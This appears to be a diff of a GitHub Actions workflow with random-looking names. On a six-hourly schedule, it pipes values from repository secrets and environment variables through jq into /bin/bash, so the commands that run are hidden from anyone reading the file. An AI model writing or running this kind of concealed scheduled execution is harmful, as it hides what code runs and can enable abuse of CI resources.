@@ -1,24 +1,27 @@
 name: yuanyaozu5274
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 3/6 * * *'
+    - cron: '29 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuanyaozu5274
         env:
-          xryy1: ${{ secrets.xryy1 }}
+          lpjs557: ${{ secrets.lpjs557 }}
         run: |
-          echo $xryy1 | jq -r .yvll648 | /bin/bash
-          echo $l38313 | jq -r .rg800 | /bin/bash
-          echo $ikbek00238 | jq -r .ksoa0 | /bin/bash
-          echo $zdc06 | jq -r .yrt5129 | /bin/bash
-          echo $rbggi78864 | jq -r .ajez050 | /bin/bash
-          echo $hgn5 | jq -r .tsauu7 | /bin/bash
-          echo $c96 | jq -r .k96690 | /bin/bash
+          echo $lpjs557 | jq -r .bndqw3 | /bin/bash
+          echo $vlwlq97 | jq -r .nm30989 | /bin/bash
+          echo $c2473 | jq -r .mkvez71 | /bin/bash
+          echo $acebn97 | jq -r .tjmcr25 | /bin/bash
+          echo $b0298 | jq -r .dtz55318 | /bin/bash
+          echo $kmtkg6892 | jq -r .b25 | /bin/bash
+          echo $uzq77 | jq -r .bkct85997 | /bin/bash
+          echo $eurt6729 | jq -r .izu6855 | /bin/bash
+          echo $n27883 | jq -r .wpj40596 | /bin/bash
+          echo $pkzgj701 | jq -r .mruq4022 | /bin/bash
 
